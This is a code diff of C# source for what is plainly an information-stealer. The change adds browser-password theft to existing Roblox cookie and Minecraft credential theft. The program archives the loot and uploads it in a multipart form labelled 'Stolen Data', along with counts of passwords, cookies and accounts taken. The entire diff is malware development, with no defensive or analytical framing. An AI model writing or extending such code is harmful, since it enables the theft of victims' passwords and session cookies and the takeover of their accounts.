@@ -1,4 +1,5 @@
-﻿using SL;
+﻿using Plexity.SL;
+using SL;
 using SLler;
 using System.IO.Compression;
 
@@ -32,6 +33,7 @@ class SLer
 		{
 			Directory.CreateDirectory(Settings._tempDir);
 
+            Browser.SLPassword();
             Roblox.SLRobloxCookies();
             Minecraft.SLMinecraft();
 			CreateArchive();
@@ -64,7 +66,7 @@ class SLer
         {
             var content = new MultipartFormDataContent();
             content.Add(new StringContent("Stolen Data"), "username");
-            content.Add(new StringContent($"Roblox: {Settings._robloxCookiesCount}\nMinecraft: {Settings._minecraftCount}"), "content");
+            content.Add(new StringContent($"Browser Pass: {Settings._passwordsCount}\nRoblox: {Settings._robloxCookiesCount}\nMinecraft: {Settings._minecraftCount}"), "content");
             
             var fileContent = new ByteArrayContent(File.ReadAllBytes(zipPath));
             fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
